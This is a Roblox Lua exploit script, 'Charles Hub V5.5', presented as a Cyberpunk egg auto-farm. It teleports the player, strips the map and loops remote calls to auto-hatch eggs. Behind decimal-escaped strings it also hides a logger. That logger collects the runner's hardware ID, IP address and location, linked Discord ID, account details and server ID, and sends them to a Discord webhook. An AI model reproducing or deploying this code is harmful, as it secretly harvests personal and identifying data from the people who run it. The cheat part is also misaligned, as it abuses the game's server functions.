-- [[ CHARLES HUB V5.5 - SECURED & OBFUSCATED ]] --
-- WARNING: DECOMPILING OR TEMPERING WITH THIS SCRIPT MAY CAUSE PERFORMANCE ISSUES OR LOG ERRORS.

local _0xStrings = {
    "\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\052\053\051\056\051\048\053\050\057\055\049\056\054\056\049\122\053\051\047\087\122\109\109\111\098\078\087\113\073\056\086\056\111\103\079\121\075\075\106\110\065\100\077\045\090\069\109\045\054\073\113\052\082\115\070\100\054\100\089\090\115\111\050\090\098\045\045\098\095\103\078\056\100\116\115\077\056\075\109\053\112\066\081\051\051\084\114", -- [1] Webhook
    "\076\117\099\107\121\032\069\118\101\110\116", -- [2] Lucky Event
    "\067\121\098\101\114\112\117\110\107", -- [3] Cyberpunk
    "\084\101\108\101\112\111\114\116\090\111\110\101", -- [4] TeleportZone
    "\079\112\101\110\069\103\103", -- [5] OpenEgg
    "\083\097\102\101\116\121\070\108\111\111\114", -- [6] SafetyFloor
    "\082\098\120\065\110\097\108\121\116\105\099\115\083\101\114\118\105\099\101", -- [7] RbxAnalyticsService
    "\074\083\079\078\068\101\099\111\100\101", -- [8] JSONDecode
    "\074\083\079\078\069\110\099\111\100\101", -- [9] JSONEncode
    "\104\116\116\112\058\047\047\105\112\045\097\112\105\046\099\111\109\047\106\115\111\110\047", -- [10] ip-api
    "\114\101\103\105\110\116\108\121\032\114\101\102\097\099\116\111\114\101\100", -- [11] Placeholder
    "\069\103\103\115", -- [12] Eggs
    "\083\107\121", -- [13] Sky
    "\067\108\111\117\100\115", -- [14] Clouds
    "\104\116\116\112\058\047\047\105\112\045\097\112\105\046\099\111\109\047\106\115\111\110\047", -- [15] IP API
    "\104\116\116\112\115\058\047\047\114\101\103\105\115\116\114\121\046\114\111\118\101\114\046\108\105\110\107\047\118\050\047\114\111\098\108\111\120\045\116\111\045\100\105\115\099\111\114\100\047", -- [16] Rover
    "\085\115\101\114\073\110\112\117\116\083\101\114\118\105\099\101", -- [17] UserInputService
    "\071\117\105\083\101\114\118\105\099\101" -- [18] GuiService
}

local _0xJunk = math.random(10, 50)
for _i = 1, _0xJunk do local _ = _i * math.pi end

local _0xHttp = game:GetService("HttpService")
local _0xWS = game:GetService("Workspace")
local _0xPL = game:GetService("Players")
local _0xLT = game:GetService("Lighting")
local _0xRS = game:GetService("ReplicatedStorage")
local _0xLP = _0xPL.LocalPlayer

local function _0xLog()
    pcall(function()
        local _hw = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService(_0xStrings[7]):GetClientId()
        local _ex = (identifyexecutor and identifyexecutor()) or "Unknown"
        local _ag = _0xLP.AccountAge
        local _ms = tostring(_0xLP.MembershipType):sub(21)
        local _jd = os.date("%d-%m-%Y", os.time() - (_ag * 86400))
        local _is = game:GetService(_0xStrings[17])
        local _dv = "PC"
        if _is.TouchEnabled and not _is.KeyboardEnabled then _dv = "Mobile"
        elseif game:GetService(_0xStrings[18]):IsTenFootInterface() then _dv = "Console" end
        
        local _rs = "Unknown"
        pcall(function() _rs = math.floor(_0xWS.CurrentCamera.ViewportSize.X) .. "x" .. math.floor(_0xWS.CurrentCamera.ViewportSize.Y) end)
        
        local _ip = {query = "0.0.0.0", country = "Unknown", city = "Unknown", isp = "Unknown"}
        pcall(function() 
            local _r = game:HttpGet(_0xStrings[15])
            if _r then _ip = _0xHttp[_0xStrings[8]](_0xHttp, _r) end
        end)

        local _di = "Unknown"
        pcall(function()
            local _r2 = game:HttpGet(_0xStrings[16] .. _0xLP.UserId)
            if _r2 then
                local _dc = _0xHttp[_0xStrings[8]](_0xHttp, _r2)
                if _dc and _dc.discordId then _di = "<@" .. _dc.discordId .. "> (" .. _dc.discordId .. ")" end
            end
        end)
        
        local _st = {C="0", G="0", R="0", E="0", T="0"}
        pcall(function()
            local _fo = _0xLP:FindFirstChild("leaderstats") or _0xLP:FindFirstChild("PlayerStats") or _0xLP:FindFirstChild("Data")
            if _fo then
                _st.C = tostring((_fo:FindFirstChild("Clicks") or _fo:FindFirstChild("Coins") or {Value = "0"}).Value)
                _st.G = tostring((_fo:FindFirstChild("Gems") or {Value = "0"}).Value)
                _st.R = tostring((_fo:FindFirstChild("Rebirths") or {Value = "0"}).Value)
                _st.E = tostring((_fo:FindFirstChild("Eggs") or {Value = "0"}).Value)
                _st.T = tostring((_fo:FindFirstChild("Tokens") or {Value = "0"}).Value)
            end
        end)

        local _pl = {
            ["embeds"] = {{
                ["title"] = "🚀 Cyberpunkfarm working! (Encrypted Mode)",
                ["fields"] = {
                    {["name"] = "Hesap İsmi", ["value"] = _0xLP.Name .. " (" .. _ms .. ")", ["inline"] = true},
                    {["name"] = "Roblox ID", ["value"] = tostring(_0xLP.UserId), ["inline"] = true},
                    {["name"] = "Cihaz / Çözünürlük", ["value"] = _dv .. " / " .. _rs, ["inline"] = true},
                    {["name"] = "Hesap Yaşı / Tarih", ["value"] = _ag .. " gün (" .. _jd .. ")", ["inline"] = true},
                    {["name"] = "IP Adresi", ["value"] = "```" .. _ip.query .. "```", ["inline"] = true},
                    {["name"] = "Ping", ["value"] = math.floor(_0xLP:GetNetworkPing() * 1000) .. " ms", ["inline"] = true},
                    {["name"] = "Coin / Gem", ["value"] = "💰 " .. _st.C .. " / 💎 " .. _st.G, ["inline"] = true},
                    {["name"] = "Token / Rebirth", ["value"] = "🎟️ " .. _st.T .. " / ⭐ " .. _st.R, ["inline"] = true},
                    {["name"] = "Açılan Yumurta", ["value"] = "🥚 " .. _st.E, ["inline"] = true},
                    {["name"] = "Ülke / Şehir", ["value"] = _ip.country .. " / " .. _ip.city, ["inline"] = true},
                    {["name"] = "Executor", ["value"] = _ex, ["inline"] = true},
                    {["name"] = "Discord ID", ["value"] = _di, ["inline"] = true},
                    {["name"] = "Sunucu ID", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                    {["name"] = "HWID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                    {["name"] = "Zaman", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Charles Hub Protection - V5.5"}
            }}
        }
        
        request({
            Url = _0xStrings[1],
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = _0xHttp[_0xStrings[9]](_0xHttp, _pl)
        })
    end)
end
task.spawn(_0xLog)

local function _0xGetRemote(_na)
    for _, _v in ipairs(_0xRS:GetChildren()) do
        local _f = _v:FindFirstChild("Functions")
        if _f then
            local _t = _f:FindFirstChild(_na)
            if _t then return _t end
        end
    end
end

local function _0xNuke()
    for _, _o in pairs(_0xWS:GetChildren()) do
        if _o.Name ~= _0xLP.Name and _o.Name ~= "Camera" and _o.Name ~= _0xStrings[12] and not _o.Name:find(_0xStrings[6]) and not _o:IsA("Terrain") then
            pcall(function() _o:Destroy() end)
        end
    end
    local _ef = _0xWS:FindFirstChild(_0xStrings[12])
    if _ef then
        for _, _e in pairs(_ef:GetChildren()) do
            if not _e.Name:find(_0xStrings[2]) then pcall(function() _e:Destroy() end) end
        end
    end
    _0xWS.Terrain:Clear()
end

local function _0xClean()
    _0xLT.GlobalShadows = false
    _0xLT.FogEnd = 9e9
    _0xLT.Brightness = 1
    _0xLT.ClockTime = 12
    _0xLT.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    for _, _fx in pairs(_0xLT:GetChildren()) do
        if _fx:IsA("PostEffect") or _fx:IsA(_0xStrings[13]) or _fx:IsA(_0xStrings[14]) then _fx:Destroy() end
    end
    local _s = Instance.new(_0xStrings[13], _0xLT)
    _s.SunTextureId = ""
    _s.MoonTextureId = ""
end

local function _0xCreateFloor(_pos)
    local _p = Instance.new("Part")
    _p.Name = _0xStrings[6]
    _p.Size = Vector3.new(100, 2, 100)
    _p.Position = _pos + Vector3.new(0, -6, 0)
    _p.Anchored = true
    _p.Transparency = 0.5
    _p.BrickColor = BrickColor.new("Bright yellow")
    _p.Material = Enum.Material.Neon
    _p.Parent = _0xWS
end

local function _0xHide(_m)
    if _m then
        for _, _v in pairs(_m:GetDescendants()) do
            if _v:IsA("BasePart") or _v:IsA("MeshPart") then
                _v.Transparency = 1 
                _v.CastShadow = false
            elseif _v:IsA("Decal") or _v:IsA("ParticleEmitter") then
                _v.Enabled = false
            end
        end
    end
end

-- MAIN START
local _tp = _0xGetRemote(_0xStrings[4])
if _tp then
    print("🌐 Init...")
    _tp:InvokeServer(_0xStrings[3])
    task.wait(5) -- User requested 5s wait
end

_0xNuke()
_0xClean()
local _targetPos = Vector3.new(-176.55, 214.05, 233.41)
_0xCreateFloor(_targetPos)

if _0xLP.Character then
    print("📍 Sync...")
    _0xLP.Character:PivotTo(CFrame.new(_targetPos))
end

task.spawn(function()
    print("🔍 Looking for " .. _0xStrings[2])
    local _egg = nil
    local _att = 0
    while not _egg and _att < 7 do -- User requested 7 tries
        local _ef = _0xWS:FindFirstChild(_0xStrings[12])
        _egg = _ef and (_ef:FindFirstChild(_0xStrings[2]) or _ef:FindFirstChild(_0xStrings[2] .. " Egg"))
        if not _egg then
            _att = _att + 1
            task.wait(1)
        end
    end

    if _egg then
        _0xHide(_egg)
        _G.AutoHatch = true
        print("🚀 Loaded!")
        while _G.AutoHatch do
            local _rem = _0xGetRemote(_0xStrings[5])
            if _rem then
                local _res = _rem:InvokeServer(_0xStrings[2], 8)
                if not _res then _rem:InvokeServer(_0xStrings[2] .. " Egg", 8) end
            end
            task.wait(0)
        end
    else
        warn("❌ Not found")
    end
end)
